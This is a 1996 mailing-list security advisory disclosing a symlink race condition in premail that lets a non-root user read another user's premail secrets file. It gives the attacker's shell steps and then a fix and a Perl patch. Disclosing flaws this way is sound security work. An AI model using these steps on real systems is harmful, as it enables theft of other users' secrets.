@@ -1,0 +1,66 @@
+From: Mixmaster <lucifer@dhp.com>
+Date: Fri, 20 Dec 1996 18:50:29 -0800 (PST)
+To: cypherpunks@toad.com
+Subject: Security hole in premail
+Message-ID: <199612210235.VAA03805@dhp.com>
+MIME-Version: 1.0
+Content-Type: text/plain
+
+
+There's a pretty nasty bug in premail that allows any non-root to obtain the
+contents of the premail secrets file.  This is a race condition that can be
+exploited because an indefinite amount of time can pass between the time that
+premail checks if the secrets file exists and when it tries to write to the
+file.  It can be exploited as follows:
+
+attacker:
+
+$ umask 111
+$ ln -s ~/premail-secrets-file /tmp/.premail-secrets.$<
+
+normal user:
+
+$ premail -login
+Remember to logout when done.
+Your premail passphrase, please:
+
+All the attacker has to do is execute "touch premail-secrets-file" between the
+time that the user is prompted for the passphrase and the time when the login
+is completed.
+
+$ ls -al premail-secrets-file
+-rw-rw-rw-   1 d00d    nogroup          19 Dec 20 19:01 premail-secrets-file 
+$ cat premail-secrets-file
+[contents of premail secrets file]
+
+This bug can be fixed in two ways.  One way is to set the premail-secrets
+setting to some non-world-writable directory.  The second way is to apply the
+following patch:
+
+*** premail.orig	Fri Dec 20 18:46:01 1996
+--- premail	Fri Dec 20 18:55:54 1996
+***************
+*** 3574,3579 ****
+--- 3574,3582 ----
+      }
+      for ($triesleft = 2; !$done && $triesleft; $triesleft--) {
+  	$pass = &getpass ($x);
++ 	if(!-O $ps) {
++ 		&error ("Secrets file exists and is owned by another user\n");
++ 	}
+  	$status = &decrypt_secrets ($ps_pgp, $ps, $pass);
+  	if (!-s $ps) { unlink $ps; }
+  	$done = (!$status && -e $ps);
+
+
+
+
+
+
+
+
+
+
+
+
+
